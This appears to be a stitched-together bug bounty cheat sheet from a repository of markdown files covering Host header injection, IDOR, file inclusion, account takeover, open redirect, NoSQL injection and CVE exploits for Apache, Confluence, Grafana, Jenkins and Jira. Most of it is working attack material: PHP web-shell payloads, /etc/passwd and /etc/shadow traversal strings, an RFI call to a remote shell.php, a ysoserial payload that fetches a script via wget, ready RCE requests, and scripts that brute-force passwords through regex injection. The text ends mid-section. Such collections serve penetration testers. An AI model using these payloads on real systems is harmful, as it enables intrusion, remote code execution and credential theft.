HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

## Where to find
In the feature where the website can send email to us. For example forgot password / newsletter.

## How to exploit
1. Change the host header
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```
2. Duplicating the host header
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
3. Add line wrapping
```
GET /index.php HTTP/1.1
 Host: vulnerable-website.com
Host: evil-website.com
...
```
4. Add host override headers
```
X-Forwarded-For : evil-website.com
X-Forwarded-Host : evil-website.com
X-Client-IP : evil-website.com
X-Remote-IP : evil-website.com
X-Remote-Addr : evil-website.com
X-Host : evil-website.com
```
How to use? In this case im using "X-Forwarded-For : evil.com"
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...
```
5. Supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```




### File: Bug-Bounty-Tips/Insecure Direct Object References.md

# Insecure Direct Object Reference (IDOR)

## Introduction
IDOR stands for Insecure Direct Object Reference is a security vulnerability in which a user is able to access and make changes to data of any other user present in the system.

## Where to find
- Usually it can be found in APIs.
- Check the HTTP request that contain unique ID, for example `user_id` or `id`

## How to exploit
1. Add parameters onto the endpoints for example, if there was
```
GET /api/v1/getuser
[...]
```
Try this to bypass
```
GET /api/v1/getuser?id=1234
[...]
```

2. HTTP Parameter pollution
```
POST /api/get_profile
[...]
user_id=hacker_id&user_id=victim_id
```

3. Add .json to the endpoint
```
GET /v2/GetData/1234
[...]
```
Try this to bypass
```
GET /v2/GetData/1234.json
[...]
```

4. Test on outdated API Versions
```
POST /v2/GetData
[...]
id=123
```
Try this to bypass
```
POST /v1/GetData
[...]
id=123
```

5. Wrap the ID with an array.
```
POST /api/get_profile
[...]
{"user_id":111}
```
Try this to bypass
```
POST /api/get_profile
[...]
{"id":[111]}
```

6. Wrap the ID with a JSON object
```
POST /api/get_profile
[...]
{"user_id":111}
```
Try this to bypass
```
POST /api/get_profile
[...]
{"user_id":{"user_id":111}}
```

7. JSON Parameter Pollution
```
POST /api/get_profile
[...]
{"user_id":"hacker_id","user_id":"victim_id"}
```

8. Try decode the ID, if the ID encoded using md5,base64,etc
```
GET /GetUser/dmljdGltQG1haWwuY29t
[...]
```
dmljdGltQG1haWwuY29t => victim@mail.com

9. If the website using graphql, try to find IDOR using graphql!
```
GET /graphql
[...]
```
```
GET /graphql.php?query=
[...]
```

10.  MFLAC (Missing Function Level Access Control)
```
GET /admin/profile
```
Try this to bypass
```
GET /ADMIN/profile
```

11. Try to swap uuid with number
```
GET /file?id=90ri2-xozifke-29ikedaw0d
```
Try this to bypass
```
GET /file?id=302
```

12. Change HTTP Method
```
GET /api/v1/users/profile/111
```
Try this to bypass
```
POST /api/v1/users/profile/111
```

13. Path traversal
```
GET /api/v1/users/profile/victim_id
```
Try this to bypass
```
GET /api/v1/users/profile/my_id/../victim_id
```

14. Change request content type
```
Content-type: application/xml
```
Try this to bypass
```
Content-type: application/json
```

15. Send wildcard instead of ID
```
GET /api/users/111
```
Try this to bypass
```
GET /api/users/*
```

16. Try google dorking to find new endpoint




### File: Bug-Bounty-Tips/Local File Inclusion.md

## Local File Inclusion (LFI)

## Introduction
Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server

## Where to find
- Any endpoint that includes a file from a web server. For example, `/index.php?page=index.html`

## How to exploit
1. Basic payload
```
http://example.com/index.php?page=../../../etc/passwd
http://example.com/index.php?page=../../../../../../../../../../../../etc/shadow
```

2. URL encoding
```
http://example.com/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

3. Double encoding
```
http://example.com/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

4. UTF-8 encoding
```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

5. Using Null Byte (%00)
```
http://example.com/index.php?page=../../../etc/passwd%00
```

6. From an existent folder
```
http://example.com/index.php?page=scripts/../../../../../etc/passwd
```

7. Path truncation
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
```

8. Using PHP Wrappers: filter
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=config.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```

9. Using PHP Wrappers: zlib
```
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/shadow
```

10. Using PHP Wrappers: zip
```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

11. Using PHP Wrappers: data
```
http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

12. Using PHP Wrappers: expect
```
http://example.com/index.php?page=expect://ls
```

13. Using PHP Wrappers: input
```
POST /index.php?page=php://input&cmd=ls HTTP/1.1
Host: example.com
...

<?php echo shell_exec($_GET['cmd']); ?>
```

14. Some unique bypass
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
http://example.com/index.php?page=/.%2e/.%2e/.%2e/.%2e/etc/passwd
http://example.com/index.php?page=/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
```


### File: Bug-Bounty-Tips/Misc/Account Takeover.md

# Account Takeover

## Introduction
Account Takeover (known as ATO) is a type of identity theft where a bad actor gains unauthorized access to an account belonging to someone else.

## How to exploit
1. Using OAuth Misconfiguration
   - Victim has a account in evil.com
   - Attacker creates an account on evil.com using OAuth. For example the attacker have a facebook with a registered victim email
   - Attacker changed his/her email to victim email.
   - When the victim try to create an account on evil.com, it says the email already exists.

2. Try re-sign up using same email
   ```
   POST /newaccount
   [...]
   email=victim@mail.com&password=1234
   ```
   After sign up using victim email, try signup again but using different password
   ```
   POST /newaccount
   [...]
   email=victim@mail.com&password=hacked
   ```

3. via CSRF
   - Create an account as an attacker and fill all the form, check your info in the Account Detail.
   - Change the email and capture the request, then created a CSRF Exploit.
   - The CSRF Exploit looks like as given below. I have replaced the email value to anyemail@*******.com and submitted a request in the victim’s account.

   ```html
   <html>
   <body>
      <form action="https://evil.com/user/change-email" method="POST">
         <input type="hidden" value="victim@gmail.com"/>
         <input type="submit" value="Submit Request">
      </form>
   </body>
   </html>
   ```

4. Chaining with IDOR, for example
   ```
   POST /changepassword.php
   Host: site.com
   [...]
   userid=500&password=heked123
   ```
   500 is an attacker ID and 501 is a victim ID, so we change the userid from attacker to victim ID

5. No Rate Limit on 2FA



### File: Bug-Bounty-Tips/Misc/Email Spoofing.md

# Email Spoofing

## Introduction
Email spoofing is a technique used in spam and phishing attacks to trick users into thinking a message came from a person or entity they either know or can trust. In spoofing attacks, the sender forges email headers so that client software displays the fraudulent sender address, which most users take at face value.

## How to detect
1. Check the SPF records, if the website don't have a SPF record, the website must be vulnerable to email spoofing
```
v=spf1 include:_spf.google.com ~all
```
2. Check the DMARC records, if the website don't have a DMARC record or the value of tag policy is `none`, the website must be vulnerable to email spoofing
```
v=DMARC1; p=none; rua=mailto:dmarc@yourdomain.com
```




### File: Bug-Bounty-Tips/Misc/Exposed API keys.md

# Exposed API Keys / Token OAuth

## Introduction
Sometimes in a web application, an attacker can find some exposed API keys / token which can lead to financial loss to a company.

## How to find
1. Find API keys / token by looking at the JavaScript code on the website
2. Find API keys / token by checking the request / response header

## Tools
* [Key-Checker](https://github.com/daffainfo/Key-Checker)




### File: Bug-Bounty-Tips/Misc/JWT Vulnerabilities.md

# JWT Vulnerabilities

## Introduction
JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object.

## How to exploit
1. Modify the algorithm to "none" algorithm
```
{
  "alg": "none",
  "typ": "JWT"
}
```
2. Modify the algorithm RS256 to HS256

If you change the algorithm from RS256 to HS256, the backend code uses the public key as the secret key and then uses the HS256 algorithm to verify the signature.

3. Bruteforce HS256
   
the HS256 key strength is weak, it can be directly brute-forced, such as using the secret string as a key in the PyJWT library sample code.

## Tools
* [jwt-hack](https://github.com/hahwul/jwt-hack)




### File: Bug-Bounty-Tips/Misc/Mass Assignment.md

# Mass Assignment Attack

## Introduction
Occurs when an app allows a user to manually add parameters in an HTTP Request & the app process value of these parameters when processing the HTTP Request & it affects the response that is returned to the user. Usually occurs in Ruby on Rails / NodeJS

## How to exploit
- Normal request
```
POST /editdata
Host: vuln.com

username=daffa
```
```
HTTP/1.1 200 OK
...

username=daffa&admin=false
```

- Modified Request 
```
POST /editdata
Host: vuln.com

username=daffa&admin=true
```

```
HTTP/1.1 200 OK
...

username=daffa&admin=true
```


### File: Bug-Bounty-Tips/Misc/Password Reset Flaws.md

## Password Reset Flaws

## Introduction
Common security flaws in password reset functionality

## How to exploit
1. Parameter pollution in reset password
```
POST /reset
[...]
email=victim@mail.com&email=hacker@mail.com
```

2. Bruteforce the OTP code
```
POST /reset
[...]
email=victim@mail.com&code=$123456$
```

3. Host header Injection
```
POST /reset
Host: evil.com
[...]
email=victim@mail.com
```
```
POST /reset
Host: target.com
X-Forwarded-Host: evil.com
[...]
email=victim@mail.com
```
And the victim will receive the reset link with evil.com

4. Using separator in value of the parameter
```
POST /reset
[...]
email=victim@mail.com,hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%20hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com|hacker@mail.com
```
```
POST /reset
[...]
email=victim@mail.com%00hacker@mail.com
```

5. No domain in value of the paramter
```
POST /reset
[...]
email=victim
```

6. No TLD in value of the parameter
```
POST /reset
[...]
email=victim@mail
```

7. Using carbon copy
```
POST /reset
[...]
email=victim@mail.com%0a%0dcc:hacker@mail.com
```

8. If there is JSON data in body requests, add comma
```
POST /newaccount
[...]
{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}
```

9. Find out how the tokens generate
- Generated based on TimeStamp
- Generated based on the ID of the user
- Generated based on the email of the user
- Generated based on the name of the user



### File: Bug-Bounty-Tips/Misc/Tabnabbing.md

# Tabnabbing

## Introduction
When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.

## How to find
```html
<a href="..." target="_blank" rel="" />  

<a href="..." target="_blank" />
```

## How to Exploit
1. Attacker posts a link to a website under his control that contains the following JS code:
    ```html
    <html>
    <script>
    if (window.opener) window.opener.parent.location.replace('http://evil.com');
    if (window.parent != window) window.parent.location.replace('http://evil.com');
    </script>
    </html>
    ```
2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.
3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.


### File: Bug-Bounty-Tips/OAuth Misconfiguration.md

# OAuth Misconfiguration

## Introduction
The most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users’ accounts. By stealing a valid code or token, the attacker may be able to access the victim's account.

## Where to find
In the SSO feature. For example `Log in with google` or `Log in with facebook`.

## How to exploit
1. OAuth token stealing: Changing redirect_uri to attacker.com(Use IDN Homograph or common bypasses).
2. Change Referral header to attacker.com while requesting OAuth.
3. Create an account with victim@gmail.com with normal functionality. Create account with victim@gmail.com using OAuth functionality. Now try to login using previous credentials.
4. OAuth Token Re-use.
5. Missing or broken state parameter.
6. Lack of origin check.
7. Open Redirection on another endpoint > Use it in redirect_uri
8. If there is an email parameter after signin then try to change the email parameter to victim's one.
9. Try to remove email from the scope and add victim's email manually.
10. Only company's email is allowed? > Try to replace hd=company.com to hd=gmail.com
11. Check if its leaking client_secret parameter.
12. Go to the browser history and check if the token is there.


### File: Bug-Bounty-Tips/Open Redirect.md

## Open Redirect

## Introduction
Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain

## Where to find
- Sometimes it can be found in login / register / logout pages
- Checking the javascript source code

## How to exploit
1. Try change the domain
```
/?redir=evil.com
```

2. Using a whitelisted domain or keyword
```
/?redir=target.com.evil.com
```

3. Using `//` to bypass `http` blacklisted keyword
```
/?redir=//evil.com
```

4. Using `https:` to bypass `//` blacklisted keyword
```
/?redir=https:evil.com
```

5. Using `\\` to bypass `//` blacklisted keyword
```
/?redir=\\evil.com
```

6. Using `\/\/` to bypass `//` blacklisted keyword
```
/?redir=\/\/evil.com/
/?redir=/\/evil.com/
```

7. Using `%E3%80%82` to bypass `.` blacklisted character
```
/?redir=evil。com
/?redir=evil%E3%80%82com
```

8. Using null byte `%00` to bypass blacklist filter
```
/?redir=//evil%00.com
```

9. Using parameter pollution
```
/?next=target.com&next=evil.com
```

10. Using `@` or `%40` character, browser will redirect to anything after the `@`
```
/?redir=target.com@evil.com
/?redir=target.com%40evil.com
```

11. Creating folder as their domain
```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

12.  Using `?` characted, browser will translate it to `/?`
```
/?redir=target.com?evil.com
```

13. Bypass the filter if it only checks for domain name using `%23`
```
/?redir=target.com%23evil.com
```

14.  Host/Split Unicode Normalization
```
https://evil.c℀.example.com
```

15. Using parsing
```
http://ⓔⓥⓘⓛ.ⓒⓞⓜ
```

16. Using `°` symbol to bypass
```
/?redir=target.com/°evil.com
```

17. Bypass the filter if it only allows yoou to control the path using a nullbyte `%0d` or `%0a`
```
/?redir=/%0d/evil.com
```


### File: Bug-Bounty-Tips/Remote File Inclusion.md

## Remote File Inclusion (RFI)

## Introduction
Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.

## Where to find
- Any endpoint that includes a file from a web server. For example, `/index.php?page=index.html`

## How to exploit
1. Basic payload
```
http://example.com/index.php?page=http://daffa.info/shell.php
```

2. URL encoding
```
http://example.com/index.php?page=http%3A%2F%2Fdaffa.info%2Fshell.php
```

3. Double encoding
```
http://example.com/index.php?page=http%253A%252F%252Fdaffa.info%252Fshell.php
```

4. Using Null Byte (%00)
```
http://example.com/index.php?page=http://daffa.info/shell.php%00
```



### File: Bug-Bounty-Tips/SQLi/NoSQL Injection.md

## NoSQL injection

## Introduction
NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.

## How to Exploit
### Authentication Bypass

Basic authentication bypass using not equal ($ne) or greater ($gt)

```
in the request
- username[$ne]=toto&password[$ne]=toto
- login[$regex]=a.*&pass[$ne]=lol
- login[$gt]=admin&login[$lt]=test&pass[$ne]=1
- login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

```json
The output is
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### Extract length information

```json
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Extract data information

```json
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
```

### Extract data with "in"

```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### PHP Arbitrary Function Execution
```json
"user":{"$func": "var_dump"}
```

## Blind NoSQL

### POST

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

### GET

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload='?username=%s&password[$regex]=^%s' % (username, password + c)
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print("Found one more char : %s" % (password+c))
        password += c
```

Another example using sleep to check vuln or not
```
'%2bsleep(1)%2b'
```

### MongoDB Payloads

```bash
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
```

## Tools
* [NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool](https://github.com/codingo/NoSQLMap)

## References
* [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md)


### File: Bug-Bounty-Tips/Technologies/Apache HTTP Server.md

# Apache (HTTP Server) Common Bugs

## Introduction
What would you do if you came across a website that uses Apache (HTTP Server)?

## How to Detect
Usually in the HTTP response there is a header like this `Server: Apache` or `Server: Apache/2.4.50` and check the 404 page

1. Find the related CVE by checking Apache (HTTP Server) version
* How to find the Apache (HTTP Server) version

By checking the response header or using 404 page, sometimes the version is printed there. If you found outdated Apache (HTTP Server) version, find the CVEs at [CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/Apache-Http-Server.html)

Some example CVE:

- CVE-2021-41773 (RCE and LFI)
```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: */*
Content-Length: 7
Content-Type: application/x-www-form-urlencoded
Connection: close

echo;id
```
- CVE-2021-42013 (RCE and LFI)
```
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

echo;id
```


### File: Bug-Bounty-Tips/Technologies/Confluence.md

# Confluence Common Bugs

## Introduction
What would you do if you came across a website that uses Confluence?

## How to Detect
Try to HTTP request to `https://example.com/login.action?os_destination=%2F` and there is a form login

1. Find the related CVE by checking Confluence version
* How to find the Confluence version

Try to request to `https://example.com/login.action?os_destination=%2F` and then check the source code. You will find this line `<meta name="ajs-version-number" content="8.20.9">` so 8.20.9 is the Confluence version. If you found outdated Confluence version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-6258/Atlassian-Confluence.html)

Some example CVE:

- CVE-2022-26134 (Remote Code Execution)
```
https://example.com/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22whoami%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
```

- CVE-2021-26085 (Arbitrary File Read)
```
https://example.com/s/test/_/;/WEB-INF/web.xml
```


### File: Bug-Bounty-Tips/Technologies/Grafana.md

# Grafana

## Introduction
What would you do if you came across a website that uses Grafana?

## How to Detect
Try to HTTP request to `https://example.com/login` and there is a form login

1. Find the related CVE by checking grafana version
* How to find the grafana version

Try to request to `https://example.com/login` and then check the source code. You will find the version in JSON body `"isEnterprise":false,"latestVersion:"9.0.0","version":"8.3.2"` so 8.3.2 is the grafana version. If you found outdated grafana version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-18548/product_id-47055/Grafana-Grafana.html)

Some example CVE:

- CVE-2021-41174 (Reflected XSS)
```
https://example.com/dashboard/snapshot/%7B%7Bconstructor.constructor('alert(1)')()%7D%7D?orgId=1
```
- CVE-2020-13379 (Denial of Service)
```
https://example.com/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
```
- CVE-2020-11110 (Stored XSS)
```
POST /api/snapshots HTTP/1.1
Host: example.com
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: {{BaseURL}}
content-type: application/json
Connection: close

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```
- CVE-2019-15043 (Grafana Unauthenticated API)
```
POST /api/snapshots HTTP/1.1
Host: example.com
Connection: close
Content-Length: 235
Accept: */*
Accept-Language: en
Content-Type: application/json

{"dashboard":{"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}
```
2. Default Credentials
```
Try to login using admin as username and password
```
3. Signup Enabled
```
https://example.com/signup
```


### File: Bug-Bounty-Tips/Technologies/HAProxy.md

# HAProxy Common Bugs

## Introduction
What would you do if you came across a website that uses HAProxy?

## How to Detect
`-`

1. CVE-2021-40346 (HTTP Request Smuggling)
```
POST /index.html HTTP/1.1
Host: abc.com
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 60
 
GET /admin/add_user.py HTTP/1.1
Host: abc.com
abc: xyz
```

Source: 
- [JFrog](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/)


### File: Bug-Bounty-Tips/Technologies/Jenkins.md

# Jenkins Common Bugs

## Introduction
What would you do if you came across a website that uses Jenkins?

## How to Detect
Usually in the HTTP response there is a header like this `X-Jenkins`

1. Find the related CVE by checking jenkins version
* How to find the jenkins version

By checking the response header `X-Jenkins`, sometimes the version is printed there. If you found outdated jenkins version, find the exploit at [pwn_jenkins](https://github.com/gquere/pwn_jenkins)

Some example CVE:
- Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)

Use [ysoserial](https://github.com/frohoff/ysoserial) to generate a payload.
Then RCE using [this script](./rce/jenkins_rce_cve-2015-8103_deser.py):

```bash
java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.sh' > payload.out
./jenkins_rce.py jenkins_ip jenkins_port payload.out
```

- Authentication/ACL bypass (CVE-2018-1000861, Jenkins <2.150.1)

Details [here](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html).

If the Jenkins requests authentication but returns valid data using the following request, it is vulnerable:
```bash
curl -k -4 -s https://example.com/securityRealm/user/admin/search/index?q=a
```

Alternative RCE with Overall/Read and Job/Configure permissions [here](https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc).

- CheckScript RCE in Jenkins (CVE-2019-1003030)

How to Exploit:
- [PacketStorm](https://packetstormsecurity.com/files/159603/Jenkins-2.63-Sandbox-Bypass.html)

```
GET /jenkinselj/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=public class x {
  public x(){
"ping -c 1 xx.xx.xx.xx".execute()
}
} HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID.4495c8e0=node01jguwrtw481dx1bf3gaoq5o6no32.node0
Connection: close
Upgrade-Insecure-Requests: 1
```
URL Encoding the following for RCE
```
public class x {
  public x(){
"ping -c 1 xx.xx.xx.xx".execute()
    }
}
```
to

%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%22%70%69%6e%67%20%2d%63%20%31%20%78%78%2e%78%78%2e%78%78%2e%78%78%22%2e%65%78%65%63%75%74%65%28%29%0a%7d%0a%7d

2. Default Credentials
```
Try to login using admin as username and password
```

3. Unauthenticated Jenkins Dashboard
```
Access https://target.com and if there is no login form then it is vulnerable
```



### File: Bug-Bounty-Tips/Technologies/Jira.md

# Jira Common Bugs

## Introduction
What would you do if you came across a website that uses Jira?

## How to Detect
Try to HTTP request to `https://example.com/secure/Dashboard.jspa` or `https://example.com/login.jsp` and there is a form login

1. Find the related CVE by checking jira version
* How to find the jira version

Try to request to `https://example.com/secure/Dashboard.jspa` and then check the source code. You will find this line `<meta name="ajs-version-number" content="8.20.9">` so 8.20.9 is the jira version. If you found outdated jira version, find the CVEs at [CVEDetails](https://www.cvedetails.com/vulnerability-list/vendor_id-3578/product_id-8170/Atlassian-Jira.html)

Some example CVE:

- CVE-2017-9506 (SSRF)
```
https://example.com/plugins/servlet/oauth/users/icon-uri?consumerUri=<SSRF_PAYLOAD>
```
- CVE-2018-20824 (XSS)
```
https://example.com/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
```
- CVE-2019-8451 (SSRF)
```
https://example.com/plugins/servlet/gadgets/makeRequest?url=https://<HOST_NAME>:1337@example.com
```
- CVE-2019-8449 (User Information Disclosure)
```
https://example.com/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
```
- CVE-2019-8442 (Sensitive Information Disclosure)
```
https://example.com/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```
- CVE-2019-3403 (User Enumeration)
```
https://example.com/rest/api/2/user/picker?query=<USERNAME_HERE>
```
- CVE-2020-14181 (User Enumeration)
```
https://example.com/secure/ViewUserHover.jspa?username=<USERNAME>
```
- CVE-2020-14178 (Project Key Enumeration)
```
https://example.com/browse.<PROJECT_KEY>
```
- CVE-2020-14179 (Information Disclosure)
```
https://example.com/secure/QueryComponent!Default.jspa
```
- CVE-2019-11581 (Template Injection)
```
example.com/secure/ContactAdministrators!default.jspa

* Try the SSTI Payloads
```

- CVE-2019-3396 (Path Traversal)
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Language: en-US,en;q=0.5 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Referer: {{Hostname}}
Content-Length: 168
Connection: close

{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"../web.xml"}}}

*Try above request with the Jira target
```
- CVE-2019-3402 (XSS)
```
https://example.com/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
```

2. Signup enabled
```
POST /servicedesk/customer/user/signup HTTP/1.1
Host: example.com
Content-Type: application/json

{"email":"test@gmail.com","signUpContext":{},"secondaryEmail":"","usingNewUi":true}
```



### File: Bug-Bounty-Tips/Technologies/Laravel.md

# Laravel Common Bugs

## Introduction
What would you do if you came across a website that uses Laravel?

## How to Detect
